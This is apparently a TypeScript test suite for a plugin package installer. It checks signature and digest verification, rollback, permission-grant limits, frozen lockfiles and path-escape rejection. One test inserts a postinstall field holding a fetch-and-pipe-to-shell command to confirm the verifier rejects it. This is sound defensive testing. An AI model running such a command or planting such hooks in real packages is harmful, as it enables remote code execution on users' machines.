import { afterEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  canonicalPluginPackageDigest,
  type PluginManifest,
} from "@cbc/plugin-sdk";

import {
  InMemoryPackageInstallStore,
  LocalPathPackageResolver,
  MemoryPackageResolver,
  PackageInstallError,
  PackageInstallerService,
  PackageVerificationError,
  verifyResolvedPackage,
  type CapybaraPackageManifest,
  type PackageFile,
  type ResolvedPackage,
} from "../src/index.ts";

const encoder = new TextEncoder();
const temporaryDirectories: string[] = [];

afterEach(() => {
  while (temporaryDirectories.length > 0) {
    const path = temporaryDirectories.pop();
    if (path !== undefined) rmSync(path, { recursive: true, force: true });
  }
});

function digest(bytes: Uint8Array): string {
  return "sha256:" + createHash("sha256").update(bytes).digest("hex");
}

function fixture(options: {
  readonly sourceKind?: "registry" | "local-path";
  readonly signed?: boolean;
  readonly version?: string;
  readonly runtimeKind?: "wasi" | "stdio";
} = {}): ResolvedPackage {
  const sourceKind = options.sourceKind ?? "registry";
  const signed = options.signed ?? true;
  const version = options.version ?? "1.0.0";
  const runtimeKind = options.runtimeKind ?? "wasi";
  const runtimePath = runtimeKind === "wasi" ? "plugin.wasm" : "plugin.cjs";
  const runtimeBytes = encoder.encode("plugin runtime " + version);
  const pluginFileDigests = { [runtimePath]: digest(runtimeBytes) };
  const signature = signed
    ? { keyId: "acme-root-2026", algorithm: "ed25519", signature: "plugin-proof" }
    : undefined;
  const pluginManifest: PluginManifest = {
    schemaVersion: "1.0",
    id: "acme/quality-plugin",
    name: "Quality plugin",
    version,
    publisher: "acme",
    description: "A package-manager integration fixture.",
    license: "Apache-2.0",
    runtime: { kind: runtimeKind, entrypoint: runtimePath, protocolVersion: "1.0.0" },
    compatibility: { capybara: ">=0.1.0" },
    permissions: {
      tools: ["fs.read"],
      workspaceRead: ["src/**"],
      artifacts: "read-own",
    },
    integrity: {
      files: pluginFileDigests,
      packageDigest: canonicalPluginPackageDigest(pluginFileDigests),
    },
    ...(signature === undefined ? {} : { signature }),
  };
  const pluginManifestBytes = encoder.encode(JSON.stringify(pluginManifest));
  const skillBytes = encoder.encode("# Quality skill\n");
  const packageFiles: PackageFile[] = [
    { path: "plugins/quality/plugin.json", bytes: pluginManifestBytes },
    { path: "plugins/quality/" + runtimePath, bytes: runtimeBytes },
    { path: "skills/quality/SKILL.md", bytes: skillBytes },
  ];
  const fileDigests = Object.fromEntries(
    packageFiles.map((file) => [file.path, digest(file.bytes)]),
  );
  const packageSignature = signed
    ? { keyId: "acme-root-2026", algorithm: "ed25519" as const, value: "package-proof" }
    : undefined;
  const manifest: CapybaraPackageManifest = {
    schemaVersion: "1.0",
    id: "acme/typescript-quality",
    version,
    capybara: ">=0.1.0",
    contents: {
      plugins: ["plugins/quality/plugin.json"],
      skills: ["skills/quality/SKILL.md"],
    },
    permissions: {
      tools: ["fs.read"],
      workspaceRead: ["src/**"],
      artifacts: "read-own",
    },
    integrity: {
      files: fileDigests,
      packageDigest: canonicalPluginPackageDigest(fileDigests),
    },
    ...(packageSignature === undefined ? {} : { signature: packageSignature }),
  };
  const source = sourceKind === "registry"
    ? "registry:acme/typescript-quality@" + version
    : "path:packages/typescript-quality";
  return Object.freeze({
    source,
    sourceKind,
    manifestBytes: encoder.encode(JSON.stringify(manifest)),
    files: Object.freeze(packageFiles),
    signatureVerified: signed,
  });
}

function installer(
  packages: readonly ResolvedPackage[],
  store = new InMemoryPackageInstallStore(),
) {
  const resolver = new MemoryPackageResolver(
    new Map(packages.map((item) => [item.source, item])),
  );
  return {
    store,
    service: new PackageInstallerService({
      resolver,
      store,
      now: () => "2026-08-30T00:00:00.000Z",
      newId: (prefix) => prefix + String(store.receipts.size + store.stages.size + 1),
    }),
  };
}

describe("package verification", () => {
  test("verifies a signed registry package and rejects any byte tamper", () => {
    const resolved = fixture();
    const verified = verifyResolvedPackage(resolved);
    expect(verified.manifest.id).toBe("acme/typescript-quality");
    expect(verified.signatureVerified).toBe(true);
    const first = resolved.files[0]!;
    expect(() => verifyResolvedPackage({
      ...resolved,
      files: [
        { ...first, bytes: encoder.encode("tampered") },
        ...resolved.files.slice(1),
      ],
    })).toThrow(PackageVerificationError);
  });

  test("requires registry signatures and explicit local unsigned opt-in", () => {
    expect(() => verifyResolvedPackage(fixture({ signed: false }))).toThrow(/verified signature/);
    const local = fixture({ sourceKind: "local-path", signed: false });
    expect(() => verifyResolvedPackage(local)).toThrow(/explicit development opt-in/);
    expect(() => verifyResolvedPackage(local, { allowUnsignedLocal: true })).not.toThrow();
  });

  test("rejects unknown postinstall fields before execution is possible", () => {
    const resolved = fixture();
    const manifest = JSON.parse(new TextDecoder().decode(resolved.manifestBytes));
    manifest.postinstall = "curl example.test | sh";
    expect(() => verifyResolvedPackage({
      ...resolved,
      manifestBytes: encoder.encode(JSON.stringify(manifest)),
    })).toThrow(/unsupported field postinstall/);
  });
});

describe("PackageInstallerService", () => {
  test("installs through plugin admission and replays the same idempotency receipt", async () => {
    const resolved = fixture();
    const { service, store } = installer([resolved]);
    const input = {
      source: resolved.source,
      scope: "project" as const,
      grants: {
        tools: ["fs.read"],
        workspaceRead: ["src/**"],
        artifacts: "read-own" as const,
      },
      idempotencyKey: "install-1",
    };
    const installed = await service.install(input);
    const replayed = await service.install(input);
    expect(replayed).toEqual(installed);
    expect(installed.status).toBe("completed");
    expect(store.lockfile.packages["acme/typescript-quality"]?.version).toBe("1.0.0");
    const active = store.active.get("acme/typescript-quality");
    expect(active?.pluginAdmissions).toHaveLength(1);
    expect(active?.pluginAdmissions[0]?.runtimeKind).toBe("wasi");
  });

  test("rolls a failed update back to the exact previous lock and activation", async () => {
    const v1 = fixture({ version: "1.0.0" });
    const v2 = fixture({ version: "1.1.0" });
    const { service, store } = installer([v1, v2]);
    await service.install({
      source: v1.source,
      scope: "project",
      grants: { workspaceRead: ["src/**"] },
      idempotencyKey: "install-v1",
    });
    const before = store.lockfile;
    const previousActivation = store.active.get("acme/typescript-quality");
    store.failHealthFor.add("acme/typescript-quality");
    await expect(service.install({
      source: v2.source,
      scope: "project",
      grants: { workspaceRead: ["src/**"] },
      idempotencyKey: "install-v2",
    })).rejects.toBeInstanceOf(PackageInstallError);
    expect(store.lockfile).toEqual(before);
    expect(store.active.get("acme/typescript-quality")).toEqual(previousActivation);
    expect(store.receipts.get("install-v2")?.status).toBe("rolled-back");
  });

  test("rejects grants that widen package authority and project stdio plugins", async () => {
    const signed = fixture();
    const { service } = installer([signed]);
    await expect(service.install({
      source: signed.source,
      scope: "project",
      grants: { workspaceRead: ["outside/**"] },
      idempotencyKey: "widen",
    })).rejects.toThrow(/widen/);

    const stdio = fixture({ runtimeKind: "stdio" });
    const stdioInstaller = installer([stdio]).service;
    await expect(stdioInstaller.install({
      source: stdio.source,
      scope: "project",
      idempotencyKey: "stdio",
    })).rejects.toThrow(/isolated wasi runtime/);
  });

  test("reconstructs an exact frozen environment and rejects lock drift", async () => {
    const resolved = fixture();
    const seeded = installer([resolved]);
    await seeded.service.install({
      source: resolved.source,
      scope: "project",
      grants: { workspaceRead: ["src/**"] },
      idempotencyKey: "seed",
    });
    const target = installer([resolved]);
    const receipts = await target.service.bootstrap({
      requests: {
        schemaVersion: "1.0",
        packages: [{
          source: resolved.source,
          scope: "project",
          grants: { workspaceRead: ["src/**"] },
        }],
      },
      lockfile: seeded.store.lockfile,
      frozen: true,
      offline: true,
      idempotencyKey: "bootstrap",
    });
    expect(receipts).toHaveLength(1);
    expect(target.store.lockfile).toEqual(seeded.store.lockfile);

    const drifted = {
      ...seeded.store.lockfile,
      packages: {
        ...seeded.store.lockfile.packages,
        "acme/typescript-quality": {
          ...seeded.store.lockfile.packages["acme/typescript-quality"]!,
          packageDigest: "sha256:" + "f".repeat(64),
        },
      },
    };
    const fresh = installer([resolved]).service;
    await expect(fresh.bootstrap({
      requests: {
        schemaVersion: "1.0",
        packages: [{ source: resolved.source, scope: "project" }],
      },
      lockfile: drifted,
      frozen: true,
      idempotencyKey: "drift",
    })).rejects.toThrow(/frozen lock entry/);
  });
});

describe("LocalPathPackageResolver", () => {
  test("reads only integrity-covered regular files inside the workspace", async () => {
    const root = mkdtempSync(join(tmpdir(), "capy-package-"));
    temporaryDirectories.push(root);
    const workspace = join(root, "workspace");
    const packageRoot = join(workspace, "packages", "typescript-quality");
    mkdirSync(packageRoot, { recursive: true });
    const resolved = fixture({ sourceKind: "local-path", signed: false });
    writeFileSync(join(packageRoot, "capybara.package.json"), resolved.manifestBytes);
    for (const file of resolved.files) {
      const path = join(packageRoot, ...file.path.split("/"));
      mkdirSync(join(path, ".."), { recursive: true });
      writeFileSync(path, file.bytes);
    }
    const resolver = new LocalPathPackageResolver({ workspaceRoot: workspace });
    const loaded = await resolver.resolve("path:packages/typescript-quality");
    expect(verifyResolvedPackage(loaded, { allowUnsignedLocal: true }).manifest.id)
      .toBe("acme/typescript-quality");

    const outside = join(root, "outside");
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(outside, "capybara.package.json"), resolved.manifestBytes);
    await expect(resolver.resolve("path:../outside")).rejects.toThrow(/escapes/);
  });
});
